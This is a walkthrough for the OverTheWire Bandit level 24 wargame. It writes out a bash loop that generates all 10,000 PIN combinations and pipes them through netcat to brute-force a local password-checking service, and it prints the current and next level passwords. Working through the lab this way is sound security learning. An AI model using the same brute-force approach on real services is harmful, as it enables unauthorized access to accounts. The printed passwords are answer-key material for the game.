# Bandit Level 24 → Level 25

**Updated:** 9 November 2026

## Credentials

- **Username:** `bandit24`
- **Password:** `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`

## Connection

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

## Hints & Commands Learned

- `cat`
- `vim`
- `mktemp`
- `for` loops
- Bash brace expansion
- `chmod`
- `nc` (Netcat)
- Output redirection (`>`)

## Steps to Solve

### Step 1 – Connect to the Bandit server

Log in as `bandit24`:

```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

### Step 2 – Create a temporary working directory

Use `mktemp -d` to create a temporary directory:

```bash
mktemp -d
```

The command prints the path of the newly created directory. Copy that path and enter it:

```bash
cd /tmp/<your-created-directory>
```

Replace the placeholder with the actual directory path returned by `mktemp`.

### Step 3 – Create the PIN possibilities script

Create a file named `create_possibilities`:

```bash
vim create_possibilities
```

Add the following script:

```bash
#!/bin/bash

for i in {0000..9999}
do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i" >> possibilities.txt
done
```

Save and exit the editor.

**Explanation:**

- `for i in {0000..9999}` generates every four-digit PIN from `0000` to `9999`.
- `echo` combines the current Bandit 24 password with each PIN.
- `>> possibilities.txt` appends each generated combination to the file.
- Leading zeros are preserved because the sequence uses four-digit values.

### Step 4 – Make the script executable and run it

```bash
chmod +x create_possibilities
./create_possibilities
```

This generates the candidate password-and-PIN combinations in `possibilities.txt`.

### Step 5 – Submit the possibilities to the service

Use Netcat to send the generated combinations to the local service on port `30002`:

```bash
cat possibilities.txt | nc localhost 30002 > result.txt
```

**Explanation:**

- `cat possibilities.txt` sends the candidate combinations.
- `nc localhost 30002` connects to the password-checking service.
- `>` saves the service's responses in `result.txt`.

### Step 6 – Find the successful response

Inspect the result file:

```bash
cat result.txt
```

Look for the response indicating that the correct PIN was accepted. The successful response provides the password for Bandit Level 25.

### Step 7 – Save the next-level password

Use the retrieved password to log in as `bandit25`.

## Next Level Password

```text
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

## Key Learning Points

- `mktemp -d` creates a temporary working directory.
- Bash brace expansion can generate a sequence of values.
- A `for` loop can automate repetitive tasks.
- `chmod +x` makes a script executable.
- `>>` appends output to a file, while `>` overwrites or creates a file.
- Netcat can send data to a network service.
- A generated list of candidate values can automate PIN testing.
